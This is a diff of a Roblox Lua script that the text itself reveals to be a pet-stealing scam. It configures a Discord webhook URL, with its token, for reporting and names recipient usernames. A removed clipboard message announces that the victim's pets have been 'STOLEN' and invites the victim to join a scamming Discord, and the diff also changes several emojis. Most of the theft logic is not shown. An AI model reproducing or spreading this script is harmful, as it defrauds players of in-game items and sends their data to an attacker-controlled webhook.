@@ -1,5 +1,5 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1407326022176608267/_7XNS9c-LNZLjKHjB-c03xp9_FBexx92Kz7eYA6s-aMWHFzPbeEVAaEtMwPRySmJW5Yv"
-getgenv().Username = "BEESUCALL"
+getgenv().Username = "BEESUCALL","Terensszxc" 
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -18,7 +18,7 @@ getgenv().Username = "BEESUCALL"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("TRY IT AGAIN")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -336,7 +336,7 @@ getgenv().Username = "BEESUCALL"
 
         for _, pet in ipairs(pets) do
             local highestPriority = 99
-            local chosenEmoji = "🐶"
+            local chosenEmoji = "🚫"
             local mutation = isMutated(pet.PetName)
             local mutationData = mutation and PetPriorityData[mutation] or nil
             local petData = PetPriorityData[pet.Type] or nil
@@ -349,10 +349,10 @@ getgenv().Username = "BEESUCALL"
                 chosenEmoji = mutationData.emoji
             elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                 highestPriority = 12
-                chosenEmoji = "🐘"
+                chosenEmoji = "👍"
             elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                 highestPriority = 13
-                chosenEmoji = "👴"
+                chosenEmoji = "😵"
             end
 
             local petName = pet.PetName
